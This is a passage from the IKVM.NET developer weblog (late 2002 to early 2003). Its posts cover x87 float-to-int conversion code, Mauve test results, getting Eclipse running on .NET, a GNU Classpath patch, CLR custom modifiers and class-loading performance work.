xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax <BR>01F54418&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </PRE>
<P>When the JIT compiles an f2i bytecode, it emits a call to this function. I've never written any x87 code, so I'm going to have to make this up as I go. Let's look at each individual instruction:</P><PRE>01F543F0  ftst </PRE>
<P>No idea what the purpose of this is.</P><PRE>01F543F2&nbsp; fldcw&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; word ptr ds:[1F5FB30h] </PRE>
<P>Presumably this is used to mask the invalid-arithmetic-operand exception (#IA) that is generated by <FONT face=Courier>FISTP</FONT> when it encounters a value that cannot be represented as a 32 bit integer.</P><PRE>01F543F8 push eax </PRE>
<P>Make room on the stack for the integer.</P><PRE>01F543F9 fistp dword ptr [esp] </PRE>
<P>Convert value on the floating stack to integer and store on the regular stack in slot we just created.</P><PRE>01F543FC fldcw word ptr ds:[1F5FB34h] </PRE>
<P>Restore the FPU control word to its normal Java setting.</P><PRE>01F54402 pop eax </PRE>
<P>Load the integer we just created into EAX.</P><PRE>01F54403 cmp eax,80000000h</PRE>
<P>Is it the <EM>integer indefinite value</EM>? When the #IA exception is masked <FONT face="Courier, Monospace">FISTP</FONT> returns the <EM>integer indefinite value</EM> for floats that cannot be represented as a 32 bit integer.</P><PRE>01F54408 je 01F5440B </PRE>
<P>If it was the <EM>integer indefinite value</EM>, continue executing at 01F5440B.</P><PRE>01F5440A ret </PRE>
<P>If not, return.</P><PRE>01F5440B push eax </PRE>
<P>Save the integer indefinite value.</P><PRE>01F5440C fnstsw ax </PRE>
<P>Load the FPU status flags in AX.</P><PRE>01F5440E sahf </PRE>
<P>Load AH into the CPU status flags.</P><PRE>01F5440F pop eax </PRE>
<P>Recover the integer indefinite value.</P><PRE>01F54410 jp 01F54416 </PRE>
<P>If the parity flag is set, the original float was a NaN, so we jump to the code that clears EAX and returns.</P><PRE>01F54412 adc eax,0FFFFFFFFh </PRE>
<P>If the carry flag is set, leave EAX unchanged (i.e. add zero) otherwise add -1. This is a clever way of turning 0x80000000 into either 0x80000000 or 0x7FFFFFFF.</P><PRE>01F54415 ret </PRE>
<P>Return to the caller.</P><PRE>01F54416 xor eax,eax <BR>01F54418 ret </PRE>
<P>Set EAX to zero and return to the caller.</P>
<P>After analyzing this code, it's kind of surprising that the "exceptional" case (when the float lies outside of the representable range) is so much slower.</P>
<P>Conclusion: As usual there is no conclusion, but hopefully we learned something today ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/28/2003 11:56:00 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=88"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=88">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 15 February 2003</h2></div>
<div class="newsItems"><a name="a87"></a><div class="entry">
	<h3 class="entryTitle">Mauve</h3>
	<div class="entryBody">
		<P>Zoltan has been working on running the&nbsp;<A href="http://sources.redhat.com/mauve/">Mauve</A> testsuite on IKVM.NET running on&nbsp;<A href="http://www.go-mono.com/">Mono</A> &nbsp;and I've been doing the same on MS .NET.</P>
<P>Current status on MS .NET: 298 of 7338 tests failed<BR>Current status on Mono: 143 of 3996 tests failed</P>
<P>Thanks to <A href="http://www.klomp.org/mark/">Mark</A> for getting me started with Mauve and thanks to Zoltan for his excellent work&nbsp;on getting ikvm running on Mono.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/15/2003 19:10:50 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=87"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=87">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 12 February 2003</h2></div>
<div class="newsItems"><a name="a86"></a><div class="entry">
	<h3 class="entryTitle">Getting Eclipse to run</h3>
	<div class="entryBody">
		<P>In the comments of the previous item John asked for specific instructions to get <A href="http://www.eclipse.org/">Eclipse</A> running.</P>
<OL>
<LI>Download the most recent IKVM <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> (I just updated them). 
<LI>Download Eclipse. I use build&nbsp;<A href="http://download.eclipse.org/downloads/drops/S-M3-200211151436/eclipse-SDK-M3-win32.zip">M3</A>. 
<LI>Unzip both zip files. Here I will assume that both&nbsp;are unzipped in the root of C:\ (the ikvm zip creates an ikvm directory and all the Eclipse files end up in an eclipse directory) 
<LI>Download <A href="http://www.frijters.net/eclipse.bat">eclipse.bat</A>, save it in the eclipse directory. 
<LI>Open a Command Prompt window and cd into the eclipse directory and run eclipse.bat</LI></OL>
<P>This should do the trick. If you have any problems, please let me know.</P>
<P>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/12/2003 18:19:47 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=86"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=86">Comments [5]</a>
		
		<br clear="all">
	</div>
</div><a name="a85"></a><div class="entry">
	<h3 class="entryTitle">Finally back</h3>
	<div class="entryBody">
		<P>I came across a class file that&nbsp;was the equivalent of the following source:</P>
<P><FONT face="Courier, Monospace" size=2><FONT color=blue>class </FONT>Test<BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>public static final </FONT><FONT color=blue>int</FONT> FOO = 1;<BR><BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>static</FONT> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FOO = 1;<BR>&nbsp;&nbsp;&nbsp; }<BR>}</FONT></P>
<P>This isn't legal Java, but the class file equivalent is. The FOO field has a <EM>ConstValue</EM> attribute with the value 1 and then there is&nbsp;code in the static initializer to set the value again. The code in the static initializer isn't needed and the Java compilers I've seen so far don't emit it.</P>
<P>Anyway, IKVM handles assignments to (non-blank) final fields&nbsp;by just ignoring the assignment, but my code generator emitted a <EM>nop </EM>instruction, instead of a <EM>pop </EM>(because it should consume the value on the stack). Fixed.</P>
<P>GNU <A href="http://www.gnu.org/software/classpath/">Classpath</A> is about to release version 0.05, so I got their code from cvs and updated my native methods to work with the latest code (the only changes required were for Object[In][Out]putStream, because&nbsp;<A href="http://www.klomp.org/mark/">Mark</A> cleaned those up to use less native code, a nice improvement!). There was still one remaining issue with compiling the classpath code with <EM>ikvmc</EM>, I had to comment out a line of code in java/nio/charset/Charset.java:</P>
<P><FONT face="Courier, Monospace">&nbsp; <FONT color=blue>public final </FONT>ByteBuffer encode (String str)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=blue>return</FONT> encode (CharBuffer.wrap (str));<BR>&nbsp; }</FONT></P>
<P>CharBuffer.wrap takes an CharSequence as its argument, but my java.lang.String doesn't implement CharSequence (yet). It occurred to me that since it is legal for any reference type to be passed where an interface is expected (see <A href="http://weblog.ikvm.net/PermaLink.aspx/68">here</A>) this code was legal as well (even if String doesn't implement CharSequence), so I added support to the compiler to insert casts when the arguments on the stack do not match with the expected method arguments (but only for interface references).</P>
<P>Finally, there is still one patch required to Classpath, because new File("c://") hangs:</P><PRE>RCS file: /cvsroot/classpath/classpath/java/io/File.java,v<BR>retrieving revision 1.21<BR>diff -r1.21 File.java<BR>334,335c334<BR>&lt; if (!PlatformHelper.isRootDirectory(path))<BR>&lt; while (PlatformHelper.endWithSeparator(path))<BR>---<BR>&gt; while (!PlatformHelper.isRootDirectory(path) &amp;&amp;<BR>&gt;         PlatformHelper.endWithSeparator(path))</PRE>
<P>You wouldn't expect this to be a common occurrence, but it turns out that this exact path is constructed by the code that computes the current directory, so if you use ikvm to run a Java application in the root directory of a drive it hangs (without this patch).</P>
<P>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/12/2003 13:46:52 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=85"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=85">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 17 January 2003</h2></div>
<div class="newsItems"><a name="a84"></a><div class="entry">
	<h3 class="entryTitle">Hello Mono</h3>
	<div class="entryBody">
		<P>Zoltan Varga wrote on the <A href="https://lists.sourceforge.net/lists/listinfo/ikvm-developers">ikvm-developers</A> list:</P>
<P><EM>&nbsp;&nbsp; After lots of hacking, I managed to get IKVM to run HelloWorld under mono. This involved lots of changes/bugfixes to IKVM, the mono runtime and the class libs. I intend to submit a big patch to the mono mailing list shortly with the changes.</EM></P>
<P>Great news!</P>
<P>Unrelated to the above, I checked in a bunch of changes and updated the <A href="http://www.frijters.net/ikvm.zip">source</A> and <A href="http://www.frijters.net/ikvmbin.zip">binary</A> snapshots. I'll be out of the country for two weeks, so there probably won't be much activity.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/17/2003 22:04:28 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=84"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=84">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 16 January 2003</h2></div>
<div class="newsItems"><a name="a83"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Ted Neward wrote:</P>
<BLOCKQUOTE dir=ltr style="MARGIN-RIGHT: 0px">
<P><EM>All this really does, though, is help underscore how fundamentally broken the Java ClassLoader model really is. CLASSPATH is a gross hack and should be deprecated immediately (as in entirely absent from JDK 1.5 and up), and issues like verisoning and JAR-to-JAR dependencies resolved in a more sane and reasonable fashion. Anybody out there in bloggerland willing to go in with me on a new JSR? [</EM><A href="http://www.neward.net/ted/weblog"><EM>The Mountain of Worthless Information</EM></A><EM>]</EM></P></BLOCKQUOTE>
<P dir=ltr>I couldn't agree more. I've sent him an e-mail offering to help out with the JSR.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/16/2003 13:09:15 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=83"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=83">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 11 January 2003</h2></div>
<div class="newsItems"><a name="a82"></a><div class="entry">
	<h3 class="entryTitle">custom modifiers and return type custom attributes</h3>
	<div class="entryBody">
		<P>Suppose you have the following Managed C++ class:</P><FONT color=#0000ff size=2>
<P><FONT face="Courier, Monospace">__gc</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> </FONT><FONT color=#0000ff size=2>class</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> Foo {<BR></FONT></FONT><FONT face="Courier, Monospace"><FONT color=#0000ff size=2>&nbsp; void</FONT><FONT size=2> foo(</FONT><FONT color=#0000ff size=2>int</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> i) {}<BR>&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT color=#0000ff size=2>void</FONT><FONT size=2> foo(</FONT><FONT color=#0000ff size=2>long</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> l) {}<BR></FONT><FONT face="Courier, Monospace">};</FONT></P>
<P></FONT>How is this compiled? The problem, of course, is that <FONT size=2><FONT face=Courier><FONT color=#0000ff>int</FONT></FONT></FONT> and <FONT face=Courier color=#0000ff size=2>long</FONT> are both signed 32 bit integers. A type cannot have two methods with exactly the same signature. To solve this problem the CLR has <EM>custom modifiers </EM>(see Partion II Metadata.doc, section 7.1.1). ILDASM shows the above methods as follows:</P>
<P><FONT size=1>[...] void&nbsp; foo(int32 i) [...]<BR></FONT><FONT size=1>[...] void&nbsp; foo(int32 modopt([Microsoft.VisualC]Microsoft.VisualC.IsLongModifier) l) [...]</FONT></P>
<P>The long parameter is annotated with the optional modifier Microsoft.VisualC.IsLongModifier. Modifiers are part of the signature, so it is legal to have signatures that differ only by modifier.</P>
<P>Now, suppose&nbsp;IKVM.NET is&nbsp;compiling the following Java class:</P>
<P><FONT face="Courier, Monospace"><FONT color=blue>class</FONT> Foo {<BR>&nbsp;&nbsp;Bar foo(Bar o) {}<BR>&nbsp; Baz foo(Baz o) {}<BR>}</FONT></P>
<P>Also suppose that <FONT face="Courier, Monospace">Bar</FONT> and <FONT face="Courier, Monospace">Baz</FONT> are not yet available when the class is compiled. For the types that are not available, java.lang.Object is substituted, so now we again have two methods with the same signature. It would have been nice to use a custom modifier to resolve this, but this isn't possible for two reasons:</P>
<OL>
<LI>custom modifiers are not supported by Reflection.Emit (in .NET 1.0 and 1.1)</LI>
<LI>custom modifiers do not accept any arguments, only a type (it would be possible to generate a type for each modifier, but that would hardly be an elegant solution)</LI></OL>
<P>The solution is to use method name mangling. The next problem is that we need a place to store the name of the class that the arguments and return value actually are. The most obvious way to do this is custom attributes. Method arguments (parameters) can be annotated with custom attributes using <A href="http://msdn.microsoft.com/library/en-us/cpref/html/frlrfSystemReflectionEmitMethodBuilderClassDefineParameterTopic.asp?frame=true">MethodBuilder.DefineParameter(...)</A>. Parameters are indexed starting at one, this (and the ilasm syntax) suggests that zero refers to the return type, unfortunately DefineParameter throws an exception when it is called with zero. This bug also exists in both .NET 1.0 and 1.1. Again the work around is easy, just emit a method attribute and put the real return type class in there.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/11/2003 12:02:32 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=82"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=82">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 05 January 2003</h2></div>
<div class="newsItems"><a name="a81"></a><div class="entry">
	<h3 class="entryTitle">Why Eclipse</h3>
	<div class="entryBody">
		<P>Someone <A href="http://www.3plus4software.de/news/20030102.html">wondered</A> why I chose to try to get Eclipse to run. Three simple reasons:</P>
<UL>
<LI>Mark Wielaard posted his <A href="http://www.klomp.org/mark/gij_eclipse/">success story</A> on the GNU Classpath mailing list.</LI>
<LI>It's a complicated application and that really helps to find bugs.</LI>
<LI>It doesn't require AWT. It will be quite some time before AWT will be done (if ever), so for the time being console (or SWT) applications are all I can use.</LI></UL>
<P>Status update: I've been doing a lot of rewriting in the verifier/compiler. I now feel that I finally understand class loading (in particular, what happens when a class is <STRONG>not</STRONG>&nbsp;found). In&nbsp;the verifier and in the compiler,&nbsp;class names are now no longer used, instead references to the <EM>TypeWrapper</EM> class&nbsp;are used to identify types. This isn't just a performance optimization, but also a requirement because class names aren't necessarily unique (only within a class loader). Still no support for different classes with the same name though, it's getting closer though.</P>
<P>The reason I started this rewriting, is to&nbsp;enable dynamic binding when a class isn't found. The current compiler just inserts a <EM>throw NoClassDefFoundError</EM> when it encounters a type that couldn't be loaded (and if the verifier needed to load the type, the whole method will just be replaced with code that throws a <EM>VerifyError</EM>). This is not what&nbsp;the Sun&nbsp;JVM does, it actually retries to load the class everytime the method executes. To simulate this behavior I'm going to emit late bound code in the cases where&nbsp;a class isn't available&nbsp;when the type is&nbsp;compiled. After all this is done, I should be able to run Eclipse without the -Xbootclasspath workaround.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/05/2003 16:01:01 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=81"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=81">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 31 December 2002</h2></div>
<div class="newsItems"><a name="a80"></a><div class="entry">
	<h3 class="entryTitle">2 min 30 sec</h3>
	<div class="entryBody">
		<P>I figured out a way to lazily create the stack traces (only for ClassNotFoundException, but the principle applies to some of the other exceptions as well) and this enables me to get the improved performance without losing stack trace information. With a precompiled xerces implementation, Eclipse&nbsp;startup is now 2.5 minutes.</P>
<P>Details of what I did:</P>
<P>Previously, whenever an exception object was instantiated, a call to Throwable.fillInStackTrace was inserted, but when the exception is thrown this isn't needed (when the exception isn't thrown, but printStackTrace is called on it, the call to fillInStackTrace is needed). So the compiler now checks if the instruction following the exception constructor invocation&nbsp;is an <EM>athrow </EM>and if it is, it will not add the call to fillInStackTrace.</P>
<P>The above in itself wouldn't really help performance, because whenever an exception is caught, the full stack trace is computed (if it wasn't done before), so I added code to the compiler to detect that the exception handler didn't actually use the exception object (easy&nbsp;for code compiled with&nbsp;<EM>javac 1.1</EM>, because the first instruction of the catch block is <EM>pop</EM>, harder for code compiled with&nbsp;<EM>javac 1.4 or jikes</EM>, because it stores the exception in a local variable, even if it isn't used). If the compiler detects that the catch block discards the exception object, it will not emit a call to MapException (which in turn calls fillInStackTrace).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/31/2002 13:12:46 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=80"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=80">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 30 December 2002</h2></div>
<div class="newsItems"><a name="a79"></a><div class="entry">
	<h3 class="entryTitle">Eclipse Startup Perf</h3>
	<div class="entryBody">
		<P>A large part of the startup time of Eclipse is caused by the overhead of producing stack traces for the about 25.000 ClassNotFoundExceptions that are thrown during startup (a really lame <EM>design</EM> of the Java class loader causes it to throw multiple ClassNotFoundExceptions for each class that is loaded). Java and .NET exception handling differ sufficiently that I have to do a lot of processing to build a stack trace for each exception that is thrown, and this is pretty expensive. As a test I decided to disable stack trace generation for ClassNotFoundExceptions and this reduces Eclipse startup time to 3 minutes! Note that this isn't entirely comparable to the 7 minute figure from Saturday, because various other things have also changed.</P>
<P>An alternative optimization that I investigated, was to add a hack the ClassLoader and URLClassLoader to reuse the exception object in URLClassLoader instead of throwing a new one, this also saved a significant amount of time. I'm wondering how others feel about this optimization? It consists of two changes: 1)ClassLoader.loadClass() calls ClassLoader.findClassFast(String name, ClassNotFoundException e) which calls ClassLoader.findClass(), 2) URLClassLoader overrides findClassFast and does a check to see if it has been subclassed, if not it calls findClassImpl and passes it the exception object it got from loadClass, if it has been subclassed it call URLClassLoader.findClass which calls findClassImpl with null as the exception object.</P>
<P>We're not there yet, but progress is being made :-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/30/2002 18:00:08 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=79"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=79">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 28 December 2002</h2></div>
<div class="newsItems"><a name="a78"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<BLOCKQUOTE dir=ltr style="MARGIN-RIGHT: 0px">
<P>Have you tried the java.util.zip.ZipFile speedup patch? <A href="http://gcc.gnu.org/ml/java/2002-12/msg00288.html">http://gcc.gnu.org/ml/java/2002-12/msg00288.html</A> It made a huge difference in startup time for gij. [<A href="http://weblog.ikvm.net/commentview.aspx/76">Mark Wielaard</A>]</P></BLOCKQUOTE>
<P dir=ltr>Just did. Startup (with the CVS explorer and a Java source open) went from 7:18 to 7:03, so it does help, but not enough ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2002 17:29:40 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=78"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=78">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a77"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<BLOCKQUOTE dir=ltr style="MARGIN-RIGHT: 0px">
<P><A href="http://www.intertwingly.net/blog/1057.html">Eclipse on .NET</A>. <A href="http://weblog.ikvm.net/commentview.aspx/76">Jeroen Frijters</A>: <EM>I got Eclipse to run</EM>&nbsp; I wonder if something like <A href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/cptools/html/cpgrfnativeimagegeneratorngenexe.asp">NGEN</A> could be used to address the startup time issues. [<A href="http://www.intertwingly.net/blog/">Sam Ruby</A>]</P></BLOCKQUOTE>
<P dir=ltr>It should be possible to use <EM>ikvmc</EM> to compile the jars to .NET assemblies, at some point in the future I will probably look into this.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2002 16:57:46 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=77"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=77">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a76"></a><div class="entry">
	<h3 class="entryTitle">Eclipse on .NET</h3>
	<div class="entryBody">
		<P>I got Eclipse to run. Lot's of stuff still doesn't work, but CVS browsing and Java file editing works. Startup is very slow (a couple of minutes), but once the classes are loaded performance is OK.</P>
<P><A href="http://www.frijters.net/eclipse.jpg">Screenshot</A>. <A href="http://www.frijters.net/eclipse.log">Exception log</A>.</P>
<P>Instructions:</P>
<UL>
<LI>Download the ikvm.net <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> 
<LI>Install Eclipse 
<LI><FONT face="Courier, Monospace" size=1>cd &#92;eclipse</FONT> 
<LI><FONT face="Courier, Monospace" size=1>&#92;ikvm&#92;bin&#92;ikvm <nobr>-Djava.version=1.3</nobr> <nobr>-cp</nobr> startup.jar <nobr>-Xbootclasspath:plugins&#92;org.apache.xerces_4.0.7&#92;xercesImpl.jar;</nobr><nobr>plugins&#92;org.apache.xerces_4.0.7&#92;xmlParserAPIs.jar</nobr> org.eclipse.core.launcher.Main <nobr>-os win32</nobr> <nobr>-ws win32</nobr> <nobr>-arch x86</nobr> <nobr>-install file:C:/eclipse/</nobr></FONT> 
<LI>Ignore the "System.UnauthorizedAccessException: Access to the path "d:&#92;eclipse" is denied." exceptions</LI></UL>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2002 13:39:24 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=76"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=76">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 19 December 2002</h2></div>
<div class="newsItems"><a name="a75"></a><div class="entry">
	<h3 class="entryTitle">SourceForge</h3>
	<div class="entryBody">
		<P>I set up a SourceForge <A href="http://sourceforge.net/projects/ikvm/">project</A>. I checked in all the code and created a mailing list. Since I'm a total SourceForge newby, any comments are appreciated.</P>
<P>I expect the mailing list to be very low traffic, so if you're at all interested in following IKVM.NET, please subscribe.</P>
<P>BTW, I dropped the first dot from the name. It's now IKVM.NET.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/19/2002 09:07:54 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=75"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=75">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 17 December 2002</h2></div>
<div class="newsItems"><a name="a74"></a><div class="entry">
	<h3 class="entryTitle">Back home and logs</h3>
	<div class="entryBody">
		<P>I'm back from Bonaire. Many things to do, and I'm not sure when there will be progress.</P>
<P>While browsing the web server logs, I found an interesting item:<BR><EM>tide72.microsoft.com using Mozilla/4.0 (compatible; MSIE 6.0; <STRONG>Windows NT 5.2</STRONG>; .NET CLR 1.0.3215; .NET CLR 1.0.3705; .NET CLR 1.1.4322; <STRONG>.NET CLR 1.2.21120</STRONG>)</EM></P>
<P>Someone inside Microsoft running Whidbey on Longhorn? Not very surprising of course, but the fact the version number is 1.2 puzzles me. It has been generally assumed that Whidbey would be 2.0.</P>
<P>I'm looking forward to beta testing that stuff... On a related note, anybody have any idea when the next PDC will be?</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/17/2002 12:48:01 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=74"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=74">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 13 December 2002</h2></div>
<div class="newsItems"><a name="a73"></a><div class="entry">
	<h3 class="entryTitle">temporarily out of order</h3>
	<div class="entryBody">
		<P>The server hosting <A href="http://www.frijters.net">www.frijters.net</A> seems to be having problems. For the time being the source and binaries can be downloaded here: <A href="http://www.sumatra.nl/ikvm/ikvm.zip">source</A>, <A href="http://www.sumatra.nl/ikvm/ikvmbin.zip">binaries</A>.</P>
<P><STRONG>UPDATE: </STRONG>server is back up again.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/13/2002 19:37:56 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=73"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
